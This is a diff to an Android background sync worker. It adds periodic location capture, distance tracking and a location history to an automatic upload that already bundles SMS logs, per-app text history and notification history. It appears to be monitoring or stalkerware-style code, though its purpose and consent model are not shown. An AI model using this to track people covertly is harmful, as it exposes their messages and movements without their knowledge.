@@ -12,6 +12,10 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.Calendar
+import android.location.Location
+import com.google.android.gms.location.LocationServices
+import kotlinx.coroutines.tasks.await
+import android.content.pm.PackageManager
 
 class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {
 
@@ -47,6 +51,56 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
             val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
             val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.sumOf { it.totalTimeInForeground })
 
+            // --- LOCATION LOGIC ---
+            var lat = 0.0
+            var lon = 0.0
+            val hasPerm = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+            if (hasPerm) {
+                try {
+                    val fused = LocationServices.getFusedLocationProviderClient(ctx)
+                    // Use lastLocation for battery efficiency in background
+                    val loc = fused.lastLocation.await()
+                    if (loc != null) {
+                        lat = loc.latitude
+                        lon = loc.longitude
+                        
+                        // Calculate Displacement
+                        val lastLat = prefs.getFloat("last_lat", 0f).toDouble()
+                        val lastLon = prefs.getFloat("last_lon", 0f).toDouble()
+                        if (lastLat != 0.0) {
+                             val results = FloatArray(1)
+                             Location.distanceBetween(lastLat, lastLon, lat, lon, results)
+                             val distKm = results[0] / 1000f
+                             // Only count if moved > 50 meters (drift filter)
+                             if (results[0] > 50) {
+                                 val newTotal = prefs.getFloat("total_distance_km", 0f) + distKm
+                                 prefs.edit().putFloat("total_distance_km", newTotal).apply()
+                             }
+                        }
+                        
+                        // Save History
+                        val locHistoryStr = prefs.getString("location_history", "[]")
+                        val locHistory = JSONArray(locHistoryStr)
+                        val point = JSONObject().apply {
+                            put("lat", lat)
+                            put("lon", lon)
+                            put("ts", System.currentTimeMillis())
+                        }
+                        locHistory.put(point)
+                        while(locHistory.length() > 50) locHistory.remove(0)
+                        
+                        prefs.edit()
+                            .putFloat("last_lat", lat.toFloat())
+                            .putFloat("last_lon", lon.toFloat())
+                            .putString("last_location_coords", "${String.format("%.4f", lat)}, ${String.format("%.4f", lon)}")
+                            .putString("location_history", locHistory.toString())
+                            .apply()
+                    }
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+
             val json = JSONObject()
             json.put("device_model", android.os.Build.MODEL)
             json.put("battery_level", level)
@@ -56,6 +110,7 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
             json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
             json.put("text_history", JSONObject(prefs.getString("text_history_by_app", "{}")))
             json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
+            json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
             json.put("trigger", "AUTO_WORKER")
 
             // 3. Upload
